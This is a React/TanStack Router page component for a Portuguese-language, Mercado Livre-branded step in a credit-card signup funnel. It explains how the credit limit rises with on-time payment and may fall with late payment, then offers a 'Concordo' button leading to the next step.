import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { TrendingUp, TrendingDown, Calendar, CreditCard, ShieldCheck } from "lucide-react";
import { FunnelSteps } from "@/components/FunnelSteps";
import { SiteFooter } from "@/components/SiteFooter";

export const Route = createFileRoute("/limite")({
  head: () => ({
    meta: [
      { title: "Entenda seu limite - Mercado Livre" },
      { name: "description", content: "Saiba como seu limite de crédito pode aumentar ou diminuir." },
    ],
  }),
  component: Limite,
});

function Limite() {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      <FunnelSteps current={3} />

      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <div className="flex justify-center mb-3">
            <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-[#2A68C8] to-[#3483FA] flex items-center justify-center shadow-lg">
              <CreditCard className="w-7 h-7 text-white" strokeWidth={2.2} />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-2">
            Entenda como funciona seu limite
          </h1>
          <p className="text-sm text-gray-600 text-center mb-6">
            Saiba como seu limite de crédito pode aumentar ou diminuir conforme o uso
          </p>

          <div className="relative bg-gradient-to-br from-[#EAF2FE] to-white border-2 border-[#3483FA]/30 rounded-2xl p-5 mb-4 overflow-hidden">
            <div className="absolute -top-8 -right-8 w-24 h-24 rounded-full bg-[#FFE600]/30 blur-xl" />
            <div className="relative flex items-start gap-3">
              <div className="w-11 h-11 rounded-xl bg-[#16A34A] flex items-center justify-center shrink-0 shadow-md">
                <TrendingUp className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-1">
                  <div className="text-gray-900 font-extrabold text-base">Aumento de Limite</div>
                  <span className="text-[9px] font-bold bg-[#16A34A] text-white px-1.5 py-0.5 rounded">BOM</span>
                </div>
                <p className="text-xs text-gray-700 leading-snug">
                  Pagando suas faturas <span className="font-bold">em dia</span>, seu limite será aumentado constantemente.
                </p>
                <div className="mt-2 flex items-center gap-1.5 text-[11px] text-[#16A34A] font-semibold">
                  <Calendar className="w-3.5 h-3.5" />
                  Revisão automática a cada 60 dias
                </div>
              </div>
            </div>
          </div>

          <div className="relative bg-gradient-to-br from-[#FFF9DB] to-white border-2 border-[#E8B84A]/40 rounded-2xl p-5 mb-6 overflow-hidden">
            <div className="absolute -bottom-8 -left-8 w-24 h-24 rounded-full bg-[#E8B84A]/20 blur-xl" />
            <div className="relative flex items-start gap-3">
              <div className="w-11 h-11 rounded-xl bg-[#D32F2F] flex items-center justify-center shrink-0 shadow-md">
                <TrendingDown className="w-5 h-5 text-white" strokeWidth={2.5} />
              </div>
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-1">
                  <div className="text-[#B8860B] font-extrabold text-base">Redução de Limite</div>
                  <span className="text-[9px] font-bold bg-[#D32F2F] text-white px-1.5 py-0.5 rounded">ATENÇÃO</span>
                </div>
                <p className="text-xs text-gray-700 leading-snug">
                  Se houver <span className="font-bold">atraso</span> no pagamento das faturas, o limite poderá ser reduzido.
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center justify-center gap-2 text-[11px] text-gray-600 mb-4">
            <ShieldCheck className="w-4 h-4 text-[#3483FA]" />
            <span>Política transparente · sem taxas escondidas</span>
          </div>

          <button
            onClick={() => navigate({ to: "/personalizar" })}
            className="w-full bg-[#2A68C8] hover:bg-[#1E5BBA] text-white text-lg font-semibold py-4 rounded-md shadow-md transition-all"
          >
            Concordo
          </button>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}
